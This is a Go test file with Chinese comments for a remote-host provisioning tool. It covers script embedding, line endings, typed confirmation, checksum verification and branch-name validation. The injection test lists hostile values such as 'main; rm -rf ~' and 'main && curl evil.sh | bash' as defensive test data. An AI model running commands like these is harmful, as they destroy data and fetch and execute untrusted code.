package app

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// 内嵌脚本必须与仓库源文件一致，否则注入远端的会是过期副本。
func TestEmbeddedInstallScriptMatchesRepoSSOT(t *testing.T) {
	embedded, err := embeddedScripts.ReadFile("embed/install.sh")
	if err != nil {
		t.Fatalf("读取内嵌脚本失败: %v", err)
	}
	onDisk, err := os.ReadFile(filepath.Join("..", "..", "scripts", "install.sh"))
	if err != nil {
		t.Fatalf("读取仓库脚本失败: %v", err)
	}
	if normalizeScriptNewlines(string(embedded)) != normalizeScriptNewlines(string(onDisk)) {
		t.Fatal("internal/app/embed/install.sh 与 scripts/install.sh 不一致；请运行: go generate ./internal/app")
	}
}

// 注入远端的脚本必须是 LF：CRLF 会让远端 bash 报 $'\r': command not found。
func TestInstallScriptHasNoCarriageReturn(t *testing.T) {
	script, err := installScript()
	if err != nil {
		t.Fatalf("installScript() 失败: %v", err)
	}
	if strings.Contains(script, "\r") {
		t.Fatal("注入远端的脚本不得包含 CR，否则远端 bash 解析失败")
	}
	if !strings.Contains(script, "#!/bin/bash") {
		t.Fatal("脚本内容不完整")
	}
}

func TestNormalizeScriptNewlines(t *testing.T) {
	if got := normalizeScriptNewlines("a\r\nb\rc\nd"); got != "a\nb\nc\nd" {
		t.Fatalf("规范化结果 = %q", got)
	}
}

// 首次置备必须显式确认；已装过 Dec 的机器视为已建立信任，不再反复确认。
func TestProvisionTypedConfirmRequiredOnFirstProvisionOnly(t *testing.T) {
	target := RemoteTarget{Host: "build.example", User: "dev"}

	first := AnalyzeProvisionTypedConfirm(target, &RemoteHostProbe{DecInstalled: false})
	if !first.Required {
		t.Fatal("首次置备必须要求显式确认")
	}
	if first.Expect != "dev@build.example" {
		t.Fatalf("应要求键入目标名，实际 %q", first.Expect)
	}

	again := AnalyzeProvisionTypedConfirm(target, &RemoteHostProbe{DecInstalled: true})
	if again.Required {
		t.Fatal("已安装的机器升级不应反复要求确认")
	}
	if !MatchProvisionTypedConfirm("", false, again) {
		t.Fatal("不需要确认时应直接通过")
	}
}

// probe 为 nil 时必须按最保守处理，要求确认。
func TestProvisionTypedConfirmRequiredWhenProbeUnknown(t *testing.T) {
	spec := AnalyzeProvisionTypedConfirm(RemoteTarget{Alias: "box"}, nil)
	if !spec.Required {
		t.Fatal("探测结果未知时应要求确认")
	}
}

func TestMatchProvisionTypedConfirm(t *testing.T) {
	spec := AnalyzeProvisionTypedConfirm(RemoteTarget{Alias: "build-box"}, nil)

	if MatchProvisionTypedConfirm("", false, spec) {
		t.Fatal("空输入不应通过")
	}
	if MatchProvisionTypedConfirm("wrong-host", false, spec) {
		t.Fatal("错误主机名不应通过")
	}
	if !MatchProvisionTypedConfirm("build-box", false, spec) {
		t.Fatal("正确主机名应通过")
	}
	if !MatchProvisionTypedConfirm("PROVISION", false, spec) {
		t.Fatal("PROVISION 应通过")
	}
	if !MatchProvisionTypedConfirm("", true, spec) {
		t.Fatal("MCP 的 confirmed=true 应通过")
	}
}

// 设备互斥键必须稳定且大小写无关，不同目标机不得撞键。
func TestDeviceOperationKey(t *testing.T) {
	a := DeviceOperationKey(RemoteTarget{Host: "Build.Example", User: "Dev"})
	b := DeviceOperationKey(RemoteTarget{Host: "build.example", User: "dev"})
	if a != b {
		t.Fatalf("同一目标应产生同一键: %q vs %q", a, b)
	}
	if !IsDeviceOperationKey(a) {
		t.Fatalf("应被识别为设备键: %q", a)
	}
	other := DeviceOperationKey(RemoteTarget{Alias: "other-box"})
	if other == a {
		t.Fatal("不同目标不得撞键")
	}
	if IsDeviceOperationKey("D:/workspace/GitHub/Dec") {
		t.Fatal("真实项目路径不应被误判为设备键")
	}
	if IsDeviceOperationKey("") {
		t.Fatal("空值不应被误判为设备键")
	}
}

// 分支名会拼进远端命令行，必须挡住命令注入。
func TestValidBranchNameRejectsInjection(t *testing.T) {
	bad := []string{
		"main; rm -rf ~",
		"main && curl evil.sh | bash",
		"main`whoami`",
		"main$(id)",
		"main|tee",
		"main\nrm -rf /",
		"main'",
		"main\"",
		"main x",
	}
	for _, name := range bad {
		if validBranchName(name) {
			t.Fatalf("应拒绝危险分支名: %q", name)
		}
	}
	for _, name := range []string{"ReleaseLatest", "ReleaseTest", "feature/foo-bar_v1.2"} {
		if !validBranchName(name) {
			t.Fatalf("应接受合法分支名: %q", name)
		}
	}
}

func TestStripANSIAndBoxDrawing(t *testing.T) {
	if got := stripANSI("\033[0;32m✓\033[0m  安装成功"); got != "✓  安装成功" {
		t.Fatalf("去色结果 = %q", got)
	}
	if !isBoxDrawing("╔═══════════════╗") {
		t.Fatal("装饰行应被识别")
	}
	if isBoxDrawing("下载 Dec 程序组...") {
		t.Fatal("正常内容不应被当作装饰行")
	}
}

// 远端输出必须按级别转发，警告与错误不能被降级成 info。
func TestForwardRemoteOutputMapsLevels(t *testing.T) {
	var levels []EventLevel
	var messages []string
	reporter := ReporterFunc(func(event OperationEvent) {
		levels = append(levels, event.Level)
		messages = append(messages, event.Message)
	})

	forwardRemoteOutput(reporter, "provision.install", strings.Join([]string{
		"╔════════════╗",
		"",
		"\033[0;34mℹ\033[0m  检测到平台: linux-amd64",
		"\033[1;33m⚠\033[0m  未提供产物摘要",
		"\033[0;31m✗\033[0m  下载失败",
	}, "\n"))

	if len(levels) != 3 {
		t.Fatalf("应转发 3 条（跳过装饰行与空行），实际 %d: %v", len(levels), messages)
	}
	if levels[0] != EventInfo || levels[1] != EventWarn || levels[2] != EventError {
		t.Fatalf("级别映射错误: %v", levels)
	}
	if !strings.Contains(messages[1], "未提供产物摘要") {
		t.Fatalf("消息内容错误: %q", messages[1])
	}
}

// 目标机存在阻断项时必须拒绝置备，而不是装到一半失败。
func TestProvisionRejectsInvalidTarget(t *testing.T) {
	if _, err := ProvisionRemoteHost(nil, ProvisionRemoteHostInput{}, nil); err == nil {
		t.Fatal("空目标应报错")
	}
}

// install.sh 必须真的带上摘要校验，且缺失摘要时是警告而非静默通过。
func TestInstallScriptContainsChecksumVerification(t *testing.T) {
	script, err := installScript()
	if err != nil {
		t.Fatalf("installScript() 失败: %v", err)
	}
	for _, want := range []string{
		"extract_checksum",
		"compute_sha256",
		"产物校验失败",
		"未提供产物摘要",
		"产物校验通过",
	} {
		if !strings.Contains(script, want) {
			t.Fatalf("安装脚本缺少 %q，摘要校验未落地", want)
		}
	}
	// 校验失败必须删除产物并中止，不能留下一个未验证的二进制。
	idx := strings.Index(script, "产物校验失败")
	if idx < 0 {
		t.Fatal("未找到校验失败分支")
	}
	tail := script[idx:]
	window := len(tail)
	if window > 400 {
		window = 400
	}
	if !strings.Contains(tail[:window], "exit 1") {
		t.Fatal("校验失败必须中止安装")
	}
}
